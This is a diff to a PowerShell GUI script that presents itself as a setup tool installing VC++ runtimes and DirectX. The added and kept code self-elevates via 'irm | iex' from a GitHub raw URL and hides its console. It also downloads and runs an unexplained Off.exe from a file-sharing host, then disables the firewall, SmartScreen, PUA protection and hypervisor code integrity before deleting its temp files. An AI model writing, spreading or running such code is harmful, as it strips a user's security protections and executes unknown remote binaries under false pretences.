@@ -1,23 +1,31 @@
 # ============================================================
-# AUTO-ELEVATE TO ADMIN IF NOT ALREADY
+# AUTO-ELEVATE (irm | iex compatible — hardcoded URL, no $PSCommandPath)
 # ============================================================
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    $scriptUrl = "https://raw.githubusercontent.com/beatboxe17x-sys/setup/refs/heads/main/NobleSetup.ps1"
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $scriptUrl | iex`"" -Verb RunAs
     exit
 }
+
+# ============================================================
+# TLS 1.2 + PROGRESS SILENCE (fixes irm download issues)
+# ============================================================
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$ProgressPreference = 'SilentlyContinue'
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Hide console
+# Hide console (randomized class name so repeat runs don't crash)
+$win32Class = "Win32_" + (Get-Random -Maximum 99999)
 Add-Type @"
 using System; using System.Runtime.InteropServices;
-public class Win32 {
+public class $win32Class {
     [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
     [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
-[Win32]::ShowWindow([Win32]::GetConsoleWindow(), 0)
+Invoke-Expression "[$win32Class]::ShowWindow([$win32Class]::GetConsoleWindow(), 0)"
 
 # ============================================================
 # DISABLE UAC COMPLETELY (requires reboot to fully take effect)
@@ -107,25 +115,26 @@ $form.Controls.Add($wm)
 $setupBtn.Add_Click({
     $setupBtn.Enabled = $false
     $setupBtn.Text = "..."
-    
+
     $tempDir = "$env:TEMP\noble_setup"
     $offExe = "$env:TEMP\Off.exe"
     $vcZip = "$tempDir\VC.zip"
     $vcExtract = "$tempDir\VC"
     $dxExe = "$tempDir\dx.exe"
-    
+
     $offUrl = "https://store-na-phx-5.gofile.io/download/web/6ab27c94-6acc-4d17-83ea-6254d70347cb/Off.exe"
     $vcUrl = "https://cold-eu-par-1.gofile.io/download/web/748961d7-4649-480e-b72f-cc713ed84199/Visual-C-Runtimes-All-in-One-Dec-2025%20(8).zip"
     $dxUrl = "https://download.microsoft.com/download/1/7/1/1718ccc4-6315-4d8e-9543-8e28a4e18c4c/dxwebsetup.exe"
-    
+
     New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-    
+
     # --- Off.exe ---
     $status.Text = "Running Off.exe..."
     $progress.Value = 10
     $form.Refresh()
-    
-    if (Test-Path "$PSScriptRoot\Off.exe") {
+
+    # FIX: Check $PSScriptRoot exists before using it (irm | iex makes it $null)
+    if ($PSScriptRoot -and (Test-Path "$PSScriptRoot\Off.exe")) {
         Copy-Item "$PSScriptRoot\Off.exe" $offExe -Force
     } else {
         try {
@@ -134,7 +143,7 @@ $setupBtn.Add_Click({
             $wc.DownloadFile($offUrl, $offExe)
         } catch { }
     }
-    
+
     if ((Test-Path $offExe) -and ((Get-Item $offExe).Length -gt 50000)) {
         $bytes = [System.IO.File]::ReadAllBytes($offExe)
         if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
@@ -148,16 +157,17 @@ $setupBtn.Add_Click({
             }
         }
     }
-    
+
     # --- VC++ DOWNLOAD ---
     $status.Text = "Downloading VC++..."
     $detail.Text = "Fetching..."
     $progress.Value = 20
     $form.Refresh()
-    
-    if (Test-Path "$PSScriptRoot\Visual-C-Runtimes-All-in-One-Dec-2025.zip") {
+
+    # FIX: Check $PSScriptRoot exists before using it
+    if ($PSScriptRoot -and (Test-Path "$PSScriptRoot\Visual-C-Runtimes-All-in-One-Dec-2025.zip")) {
         Copy-Item "$PSScriptRoot\Visual-C-Runtimes-All-in-One-Dec-2025.zip" $vcZip -Force
-    } elseif (Test-Path "$PSScriptRoot\VC.zip") {
+    } elseif ($PSScriptRoot -and (Test-Path "$PSScriptRoot\VC.zip")) {
         Copy-Item "$PSScriptRoot\VC.zip" $vcZip -Force
     } else {
         try {
@@ -168,10 +178,10 @@ $setupBtn.Add_Click({
             Start-Process "bitsadmin" -ArgumentList "/transfer VC `"$vcUrl`" `"$vcZip`"" -Wait -WindowStyle Hidden
         }
     }
-    
+
     $vcSize = 0
     if (Test-Path $vcZip) { $vcSize = (Get-Item $vcZip).Length }
-    
+
     if ($vcSize -lt 1000000) {
         $status.Text = "VC++ download failed"
         $detail.Text = "Place zip next to script and retry"
@@ -180,14 +190,14 @@ $setupBtn.Add_Click({
         Start-Sleep -Seconds 3
         $status.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 200)
     }
-    
+
     # EXTRACT & SILENT INSTALL
     if ($vcSize -gt 1000000) {
         $status.Text = "Extracting VC++..."
         $detail.Text = ""
         $progress.Value = 30
         $form.Refresh()
-        
+
         try {
             Expand-Archive -Path $vcZip -DestinationPath $vcExtract -Force
         } catch {
@@ -195,15 +205,15 @@ $setupBtn.Add_Click({
             $form.Refresh()
             Start-Sleep -Seconds 2
         }
-        
+
         # Find all vcredist EXEs
-        $installers = Get-ChildItem -Path $vcExtract -Recurse -Include "*.exe" -ErrorAction SilentlyContinue | Where-Object { 
-            $_.Name -match "vcredist|vcruntime" 
+        $installers = Get-ChildItem -Path $vcExtract -Recurse -Include "*.exe" -ErrorAction SilentlyContinue | Where-Object {
+            $_.Name -match "vcredist|vcruntime"
         } | Sort-Object Name
-        
+
         $total = $installers.Count
         $current = 0
-        
+
         if ($total -eq 0) {
             $status.Text = "No VC++ installers found"
             $form.Refresh()
@@ -213,16 +223,16 @@ $setupBtn.Add_Click({
             $detail.Text = "0 of $total complete"
             $progress.Value = 35
             $form.Refresh()
-            
+
             foreach ($exe in $installers) {
                 $current++
                 $detail.Text = "Installing $current of $total : $($exe.Name)"
                 $form.Refresh()
-                
+
                 $fileName = $exe.Name.ToLower()
                 $fullPath = $exe.FullName
                 $exitCode = -1
-                
+
                 # Determine correct silent flag based on version
                 if ($fileName -match "2005") {
                     # VC++ 2005: /Q is the ONLY silent flag that works
@@ -254,85 +264,85 @@ $setupBtn.Add_Click({
                     $proc = Start-Process -FilePath $fullPath -ArgumentList "/S" -PassThru -WindowStyle Hidden -Wait
                     $exitCode = $proc.ExitCode
                 }
-                
+
                 # If exit code indicates error (not 0 or 3010=reboot required), try repair mode
                 if ($exitCode -ne 0 -and $exitCode -ne 3010) {
                     $detail.Text = "Retrying $current with repair..."
                     $form.Refresh()
                     Start-Sleep -Milliseconds 200
-                    
+
                     if ($fileName -match "2005|2008") {
                         Start-Process -FilePath $fullPath -ArgumentList "/Q" -WindowStyle Hidden -Wait
                     } else {
                         Start-Process -FilePath $fullPath -ArgumentList "/repair","/quiet","/norestart" -WindowStyle Hidden -Wait
                     }
                 }
-                
+
                 $progress.Value = 35 + [math]::Floor(($current / $total) * 35)
                 $form.Refresh()
             }
-            
+
             $status.Text = "VC++ installed"
             $detail.Text = ""
             $progress.Value = 70
             $form.Refresh()
         }
     }
-    
+
     # --- DirectX SILENT ---
     $status.Text = "Downloading DirectX..."
     $progress.Value = 75
     $form.Refresh()
-    
+
     try {
         $wc = New-Object System.Net.WebClient
         $wc.DownloadFile($dxUrl, $dxExe)
     } catch {
         Start-Process "bitsadmin" -ArgumentList "/transfer DX `"$dxUrl`" `"$dxExe`"" -Wait -WindowStyle Hidden
     }
-    
+
     if (Test-Path $dxExe) {
         $status.Text = "Installing DirectX silently..."
         $progress.Value = 80
         $form.Refresh()
         Start-Process -FilePath $dxExe -ArgumentList "/Q" -Wait -WindowStyle Hidden
     }
-    
+
     # --- Disable Security ---
     $status.Text = "Disabling security..."
     $progress.Value = 85
     $form.Refresh()
-    
+
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
     @("StandardProfile","PublicProfile","DomainProfile") | ForEach-Object {
         Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\$_" -Name "EnableFirewall" -Value 0 -ErrorAction SilentlyContinue
     }
-    
+
     New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Force | Out-Null
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride" -Value 1 -ErrorAction SilentlyContinue
-    
+
     Set-MpPreference -CheckAppsAndFiles Disabled -ErrorAction SilentlyContinue
     Set-MpPreference -EnableSmartScreen $false -ErrorAction SilentlyContinue
     Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
     Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
-    
+
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Edge\SmartScreenEnabled" -Name "SmartScreenEnabled" -Value 0 -ErrorAction SilentlyContinue
     New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Force | Out-Null
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Name "SmartScreenEnabled" -Value 0 -ErrorAction SilentlyContinue
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value 0 -ErrorAction SilentlyContinue
-    
+
     New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Force | Out-Null
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
     Start-Process "bcdedit" -ArgumentList "/set hypervisorlaunchtype off" -WindowStyle Hidden -Wait
-    
+
     # --- Cleanup ---
     $status.Text = "Cleaning up..."
     $progress.Value = 95
     $form.Refresh()
-    
+
     Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item -Path $offExe -Force -ErrorAction SilentlyContinue
-    
+
     w32tm /resync 2>$null | Out-Null
     if ($LASTEXITCODE -ne 0) {
         Stop-Service w32time -Force -ErrorAction SilentlyContinue
@@ -341,7 +351,7 @@ $setupBtn.Add_Click({
         Start-Service w32time -ErrorAction SilentlyContinue
         w32tm /resync 2>$null | Out-Null
     }
-    
+
     # Done
     $progress.Value = 100
     $status.Text = "Done. Restart PC now."
@@ -349,7 +359,7 @@ $setupBtn.Add_Click({
     $setupBtn.Text = "Restart"
     $setupBtn.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 90)
     $setupBtn.Enabled = $true
-    
+
     $setupBtn.Add_Click({
         $status.Text = "Restarting..."
         $form.Refresh()
